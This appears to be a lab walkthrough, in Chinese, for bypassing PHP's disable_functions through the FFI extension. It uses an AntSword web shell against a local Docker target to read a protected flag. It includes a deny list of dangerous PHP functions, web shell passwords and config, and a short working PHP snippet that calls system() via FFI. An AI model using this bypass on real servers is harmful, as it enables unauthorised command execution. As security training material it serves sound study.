## 08 利用 FFI 扩展

### php.ini 配置如下:

```ini
disable_functions=pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,system,putenv
```

### 使用条件

* Linux 操作系统
* PHP >= 7.4
* 开启了 FFI 扩展且 ffi.enable=true

```
[ffi]
; FFI API restriction. Possible values:
; "preload" - enabled in CLI scripts and preloaded files (default)
; "false"   - always disabled
; "true"    - always enabled
ffi.enable=true

; List of headers files to preload, wildcard patterns allowed.
;ffi.preload=
```

###  绕过实验

AntSword >= 2.1.4

我们的最终目的是获取 `/flag` 的内容, 这个文件是 600 权限，`www-data` 用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 `tac` 命令(具体看 `/start.sh`)来获取 flag

1. 启动环境

```
$ docker-compose up -d
```

Shell | 密码
:-:|:-:
`http://127.0.0.1:18080/index.php` | ant
`http://127.0.0.1:18080/shell.php` | ant

2. 打开 AntSword 添加 Shell

![1.png](https://i.loli.net/2020/03/12/fCaItVpEKUsjNlr.png)

也可直接使用配置导入插件导入下面的配置:

```
{"_id":"NKonQAcRd5DAIcRj","addr":"IANA 保留地址用于本地回送","category":"default","ctime":1562515402313,"decoder":"default","encode":"UTF8","encoder":"base64","httpConf":{"body":{},"headers":{"User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12A365 MicroMessenger/5.4.1 NetType/WIFI"}},"ip":"127.0.0.1","note":"AntSword-Labs Bypass disable functions 8","otherConf":{"chunk-step-byte-max":"3","chunk-step-byte-min":"2","command-path":"","filemanager-cache":1,"ignore-https":1,"request-timeout":"30000","terminal-cache":0,"upload-fragment":"500","use-chunk":0,"use-multipart":0},"pwd":"ant","type":"php","url":"http://127.0.0.1:18080/index.php","utime":1562515402313}
```

3. 使用「绕过 disable_functions」插件, 选择 `PHP74_FFI` 模式进行

![2.png](https://i.loli.net/2020/03/12/qMiSx4ZrdnNE6z5.png)

> 注意: 刚点进来的时候, 左侧状态栏处除了版本之外都是 NO

4. 点击「开始」按钮后，成功之后, 会创建一个新的「虚拟终端」


5. 尝试执行命令, 成功

![3.png](https://i.loli.net/2020/03/12/s2ohQzbXLVlJmva.png)


#### 手动

PHP 代码:

```
$ffi = FFI::cdef("int system(const char *command);");
$ffi->system("whoami > /tmp/123");
echo file_get_contents("/tmp/123");
@unlink("/tmp/123");
```

运行后即可看到执行结果:

![4.png](https://i.loli.net/2020/03/12/V5Xx4ZgweMp1lHE.png)
